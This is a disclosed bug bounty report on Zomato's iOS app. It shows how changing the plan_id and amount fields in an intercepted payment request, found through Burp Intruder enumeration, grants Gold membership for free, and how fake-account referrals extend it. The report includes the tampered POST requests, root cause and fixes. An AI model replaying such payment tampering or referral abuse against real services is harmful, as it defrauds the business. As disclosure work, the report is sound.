# [www.zomato.com] Availing Zomato Gold membership for free by tampering plan id(s) 

## Report Details
- **Report ID**: 511044
- **URL**: https://hackerone.com/reports/511044
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-03-16T17:56:32.161Z
- **Disclosed**: 2019-03-18T08:09:55.631Z

## Reporter
- **Username**: pasw
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
**Summary:** 
Get free zomato gold membership using zomato iOS app.

**Description:** [add more details about this vulnerability]
1) Login to the zomato iOS application.
2) Select zomato gold from the home screen.
3) Depending on your location, you will see different gold pack options. 
4) Select any gold pack. 
5) Select payment method.
6) Intercept the api using burp. 
POST ████useragent=model_iPad__os_9.3.5__v_13.1.9__t_iPad&app_version=13.1.9&push_permission=0&session_id=7&app_run_id=1&lang=en&presentlon=77.70730672359205&uuid=YOUR_UUID

access_token=YOUR_ACCESS_TOKEN&amount=1050&city_id=4&client_id=zomato_ios_v2&email=YOUR_EMAIL&name=YOUR_NAME&██████plan_id=40

7) You can see that the api takes plan_id and amount as paramter. 
8) I decided to try various other plain_Ids using burp intruder. 
9) Using the intruder, I figured out that the plan_Id 147 has a membership cost of 0.
**(Image: intruder_plan_ids.png)**
10) Replace the plan id and amount the step 6. **( Image: api_request.png)**
POST █████████useragent=model_iPad__os_9.3.5__v_13.1.9__t_iPad&app_version=13.1.9&push_permission=0&session_id=7&app_run_id=1&lang=en&presentlon=77.70730672359205&uuid=YOUR_UUID

access_token=YOUR_ACCESS_TOKEN&amount=0&city_id=4&client_id=zomato_ios_v2&email=YOUR_EMAIL&name=YOUR_NAME&██████████plan_id=147

11) You will get the following response.   **(Image: api_response.png)**
{"response":{"status":"success","message":"Transaction Approved Without Sending to Gateway"

12) You are now a zomato gold member. 
13) There is also a referral program in zomato. In this program, if your freind buys zomato gold using your referral code, you get another 1 month of free membership. 
14) The attacker can create as many accounts as possible and share his referral code with these accounts, purchase free zomato gold from the new codes using the referral code and also get 1 month extended membership for each referral. **(Image: extended_gold_by_1_month_sharing_voucher_code.png)** 

**RCA:**
1. Some apis take in the plan_id and give the plan details in the response.
2. This makes it easier for the attacker to enumerate plan ids. 
3. Also, multiple plans are valid at the same time.

**Possible Fixes:**
1. Plan_ids should not be easily guessable.
2. Only required plans should be kept active and all other plans should be disabled.
3. If possible, for any payment made, have some extra checks when the payment_amount is zero.

## Impact

An attacker can get zomato subscription free of cost for a month. Then using the referral code, he can extended the subscription by another month for each successful free referral using fake accounts.

## Attachments
No attachments
